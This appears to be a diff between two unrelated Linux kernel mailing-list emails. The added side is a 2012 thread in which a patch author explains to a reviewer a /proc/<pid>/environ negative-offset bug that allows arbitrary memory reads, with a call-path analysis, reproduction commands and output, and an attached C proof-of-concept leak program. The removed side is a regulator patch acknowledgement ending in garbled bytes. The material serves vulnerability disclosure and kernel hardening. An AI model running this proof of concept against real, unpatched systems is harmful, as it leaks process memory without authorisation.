@@ -1,51 +1,247 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1752823Ab2GWA7Y (ORCPT <rfc822;w@1wt.eu>);
-	Sun, 22 Jul 2012 20:59:24 -0400
-Received: from comal.ext.ti.com ([198.47.26.152]:44758 "EHLO comal.ext.ti.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1752618Ab2GWA7X (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Sun, 22 Jul 2012 20:59:23 -0400
-From: "Kim, Milo" <Milo.Kim@ti.com>
-To: Axel Lin <axel.lin@gmail.com>
-CC: Mark Brown <broonie@opensource.wolfsonmicro.com>,
-        "Girdwood, Liam" <lrg@ti.com>,
-        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>
-Subject: RE: [PATCH] regulator: lp8788-buck: Remove
- lp8788_set_default_dvs_ctrl_mode function
-Thread-Topic: [PATCH] regulator: lp8788-buck: Remove
- lp8788_set_default_dvs_ctrl_mode function
-Thread-Index: AQHNZoMa1BkZIdhyCUi7/kl8jaek45c2DtVg
-Date: Mon, 23 Jul 2012 00:59:14 +0000
-Message-ID: <A874F61F95741C4A9BA573A70FE3998FDC69@DQHE02.ent.ti.com>
-References: <1342794140.3401.1.camel@phoenix>
-In-Reply-To: <1342794140.3401.1.camel@phoenix>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach: 
-X-MS-TNEF-Correlator: 
-x-originating-ip: [157.87.177.86]
-Content-Type: text/plain; charset="utf-8"
+	id S1752860Ab2GWBAV (ORCPT <rfc822;w@1wt.eu>);
+	Sun, 22 Jul 2012 21:00:21 -0400
+Received: from numidia.opendz.org ([98.142.220.152]:59911 "EHLO
+	numidia.opendz.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752618Ab2GWA7g (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Sun, 22 Jul 2012 20:59:36 -0400
+Date: Mon, 23 Jul 2012 02:04:47 +0100
+From: Djalal Harouni <tixxdz@opendz.org>
+To: Oleg Nesterov <oleg@redhat.com>
+Cc: linux-kernel@vger.kernel.org, kernel-hardening@lists.openwall.com,
+        Al Viro <viro@zeniv.linux.org.uk>,
+        Andrew Morton <akpm@linux-foundation.org>,
+        Vasiliy Kulikov <segoon@openwall.com>,
+        WANG Cong <xiyou.wangcong@gmail.com>,
+        Solar Designer <solar@openwall.com>, Kees Cook <keescook@chromium.org>
+Subject: Re: [PATCH] proc: do not allow negative offsets on
+ /proc/<pid>/environ
+Message-ID: <20120723010447.GA23410@dztty>
+References: <1342974959-2748-1-git-send-email-tixxdz@opendz.org>
+ <20120722200049.GA29222@redhat.com>
 MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="Qxx1br4bt0+wmkIi"
+Content-Disposition: inline
+In-Reply-To: <20120722200049.GA29222@redhat.com>
+User-Agent: Mutt/1.5.21 (2010-09-15)
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
-Content-Transfer-Encoding: 8bit
-X-MIME-Autoconverted: from base64 to 8bit by mail.home.local id q6N10Pvi001006
 
-> We already know the mask in lp8788_init_dvs() function, and we can
-> update
-> the corresponding bit for default_dvs_mode in lp8788_init_dvs()
-> function.
-> This function looks not necessary to me.
+
+--Qxx1br4bt0+wmkIi
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+
+Hi Oleg,
+
+On Sun, Jul 22, 2012 at 10:00:49PM +0200, Oleg Nesterov wrote:
+> On 07/22, Djalal Harouni wrote:
+> >
+> > __mem_open() which is called by both /proc/<pid>/environ and
+> > /proc/<pid>/mem ->open() handlers will allow the use of negative offsets.
+> > /proc/<pid>/mem has negative offsets but not /proc/<pid>/environ.
 > 
-> Signed-off-by: Axel Lin <axel.lin@gmail.com>
+> Probablt the patch makes sense, but I can't understand the changelog...
+> 
+> > Allowing negative offsets on /proc/<pid>/environ can turn it to act like
+> > /proc/<pid>/mem. A negative offset will pass the
+> > fs/read_write.c:lseek_execute() and the environ_read() checks and will
+> > point to another VMA.
+> 
+> which VMA?
+It depends on the offset. Please see below.
 
-Acked-by: Milo(Woogyom) Kim <milo.kim@ti.com>
-Tested-by: Milo(Woogyom) Kim <milo.kim@ti.com>
+> environ_read() can only read the memory from [env_start, env_end], and
+> it should check *ppos anyway to ensure it doesn't read something else.
+Yes I agree, but currently that's not the case, there are no checks on *ppos.
+So if you pass a negative offset you will be able to read from an arbitrary
+address.
 
-Thanks for catching this !
+I'll send another patch tomorrow to add the checks for *ppos.
 
-Best Regards,
-Milo
-ÿôèº{.nÇ+‰·Ÿ®‰­†+%ŠËÿ±éÝ¶¥Šwÿº{.nÇ+‰·¥Š{±þG«éÿŠ{ayºÊ‡Ú™ë,j­¢f£¢·hšïêÿ‘êçz_è®(­éšŽŠÝ¢j"ú¶m§ÿÿ¾«þG«éÿ¢¸?™¨è­Ú&£ø§~á¶iO•æ¬z·švØ^¶m§ÿÿÃÿ¶ìÿ¢¸?–I¥
+
+
+Since negative offsets are allowed we can pass it to lseek():
+
+1) ->llseek()
+     -> generic_file_llseek()
+        -> generic_file_llseek_size()
+           -> lseek_execute()
+
+  inside fs/read_write.c:lseek_execute() we pass the two checks and
+  file->f_pos will be updated.
+
+
+2) ->read()
+     -> environ_read()
+
+  inside environ_read() there is only a one check:
+
+  int this_len = mm->env_end - (mm->env_start + src);
+  
+  if (this_len <= 0)
+    break;
+
+
+  Here 'src' is 'src = *ppos' the negative offset converted to unsigned long
+  and (mm->env_start + src) can overflow and point to another VMA.
+
+  int this_len = mm->env_end - (mm->env_start + src)
+  
+  'this_len' will be positive and we pass that check.
+
+
+I also don't like the truncation of the result to 'int this_len'
+
+
+
+A quick example to reproduce it:
+New kernels /proc/<pid>/stat include 'mm->env_start', third number from
+the end.
+
+To read the .text area from 0x00400000:
+ 0x00400000 - (mm->env_start == 140733359794601) = negative_offset
+
+$ ./mem_environ /proc/$(pidof cat)/environ 140733359794601 | hexdump -C -v
+00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
+00000010  02 00 3e 00 01 00 00 00  a0 17 40 00 00 00 00 00  |..>.......@.....|
+00000020  40 00 00 00 00 00 00 00  40 c5 00 00 00 00 00 00  |@.......@.......|
+...
+
+mem_environ is just a program that calculats the negative offset,
+open(/proc/<pid>/environ), lseek() and read().
+
+The source is attached, just run this command to test it:
+$ ./mem_environ /proc/self/environ 0x0 | hexdump -C -v
+
+In rare cases it will not work, I don't know why.
+
+> >  static int mem_open(struct inode *inode, struct file *file)
+> >  {
+> > -	return __mem_open(inode, file, PTRACE_MODE_ATTACH);
+> > +	int ret = __mem_open(inode, file, PTRACE_MODE_ATTACH);
+> > +	if (!ret)
+> > +		/* OK to pass negative loff_t, we can catch out-of-range */
+> > +		file->f_mode |= FMODE_UNSIGNED_OFFSET;
+> > +
+> > +	return ret;
+> 
+> I guess you can set FMODE_UNSIGNED_OFFSET unconditionally, it doesn't
+> matter if __mem_open() fails. But I won't insist.
+Sure.
+
+> Oleg.
+> 
+Thanks Oleg. BTW should I resend the patch with a better changelog entry ?
+
+I'll also add another patch to check the offsets inside environ_read().
+
+-- 
+tixxdz
+http://opendz.org
+
+--Qxx1br4bt0+wmkIi
+Content-Type: text/x-c; charset=us-ascii
+Content-Disposition: attachment; filename="mem_environ.c"
+
+/*
+* /proc/<pid>/environ like /proc/<pid>/mem
+* 
+* Author: Djalal Harouni   tixxdz  opendz.org
+* License: GPLv2
+* 
+* 
+* (mm->env_start + src) will point to your page.
+* src is the offset
+* For 64bits: A negative offset.
+* For 32bits: Did not test, can we wrap ?
+*
+*/
+
+#define _LARGEFILE64_SOURCE
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define SYS_lseek       8
+
+extern char **environ;
+
+/* use **environ against a non -fPIC elf */
+static inline loff_t get_offset(unsigned long env_addr)
+{
+	unsigned long load_addr = 0x00400000;
+	return (load_addr - env_addr);
+}
+
+static loff_t kernel_lseek(int fd, loff_t offset)
+{
+	return syscall(SYS_lseek, fd, offset, SEEK_SET);
+}
+
+static int leak(char *proc_file, unsigned long env_start)
+{
+	int ret;
+	int i, fd;
+	char buf[4096];
+	loff_t offset = 0;
+
+	memset(buf, 0, sizeof(buf));
+
+	ret = -1;
+	fd = open(proc_file, O_RDONLY);
+	if (fd == -1) {
+		perror("open");
+		return ret;
+	}
+
+	if (env_start)
+		offset = get_offset(env_start);
+
+	if (!offset)
+		/* really ? */
+		offset = get_offset((unsigned long)*environ);
+
+	if (kernel_lseek(fd, offset) == (off_t) -1) {
+		perror("lseek");
+		return ret;
+	}
+
+	ret = read(fd, buf, sizeof(buf));
+	if (ret == -1) {
+		perror("read");
+		return ret;
+	}
+	close(fd);
+
+	for (i = 0; i < sizeof(buf); i++)
+		printf("%c", buf[i]);
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	unsigned long env_addr = 0;
+
+	if (argc < 3) {
+		printf("%s  /proc/<pid>/environ env_addr\n"
+		"    /proc/<pid>/environ.\n"
+		"    env_addr: start of environment\n", argv[0]);
+		return 0;
+	}
+
+	env_addr = (unsigned long) strtoul(argv[2], NULL, 0);
+	return leak(argv[1], env_addr);
+}
+
+--Qxx1br4bt0+wmkIi--
